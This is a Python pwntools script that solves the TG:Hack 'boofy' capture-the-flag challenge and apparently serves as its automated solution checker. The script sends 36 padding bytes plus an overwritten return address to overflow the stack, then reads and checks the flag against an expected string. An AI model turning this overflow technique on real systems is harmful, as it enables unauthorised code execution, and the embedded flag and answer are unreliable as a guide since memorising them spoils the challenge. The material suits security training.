from pwn import *


# set debug = True to test solution locally
debug = False

if args.REGION:
    host = args.REGION + ".boofy.tghack.no"
else:
    host = "boofy.tghack.no"

if debug:
    c = process("./boofy")
else:
    c = remote(host, 6003)

c.sendline(b"a" * 36 + p32(0x8048486))
curr = c.recvuntil("TG20")
flag = b"TG20" + c.recvline()[:-1]

if flag == "TG20{The real flag is much boofier than the other one}":
    print("yay! {}".format(flag))
    sys.exit(101)
else:
    sys.exit(102)
